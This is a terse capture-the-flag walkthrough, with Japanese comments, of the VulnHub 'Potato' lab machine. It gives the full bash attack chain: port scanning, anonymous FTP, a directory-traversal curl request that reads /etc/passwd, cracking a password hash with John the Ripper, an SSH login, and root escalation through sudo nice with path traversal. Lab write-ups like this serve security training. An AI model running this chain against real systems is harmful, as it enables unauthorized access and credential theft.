# Attack Potato Machine

```bash
ip a

// IPアドレスを特定する
sudo netdiscover -i enp0s3 -r 192.168.56.0/24 

export IP="192.168.56.102"
echo $IP
mkdir vulnhub
mkdir vulnhub/potato
cd vulnhub/potato

// ポートスキャンする
nmap -sC -sV -Pn -p- $IP -oN portscan_result.txt

ftp $IP 2112 -> anonymous -> hogehoge
ls -> get welcome.msg -> get index.php.bak -> exit
cat welcome.msg -> cat index.php.bak
export URL="http://$IP:80"
echo $URL

//ディレクトリ構造を調べる
gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt

//Directory Traversal Attack
curl -X POST -b "pass=//coolie password//" -d "file=../../../../../etc/passwd" "//URL//"
| cat | tr '\0' '\n'

cat > pass.txt  //上の結果を張り付ける
cat pass.txt | grep -P 'sh$'
cat pass.txt | grep -P 'sh$' | grep webadmin > hash.txt
cat hash.txt

//John the Ripper パスワードハッシュを解読
john hash.txt --wordlist=/usr/share/worlists/rockyou.txt
john hash.txt -show

ssh webadmin@$IP -> dragon
id -> pwd
ls -la

cat usr.txt
cat usr.txt | base64 -d

cd .. -> ls -> cd florianges -> ls -la
sudo -l -> dragon
ls -la /bin/nice
man /bin/nice
cd /notes/
ls -la
sudo /bin/nice /notes/clear.sh
sudo /bin/nice /notes/id.sh
sudo /bin/nice /notes/../bin/bash

id
pwd
ls
cat root.txt
cat root.txt | base64 -d
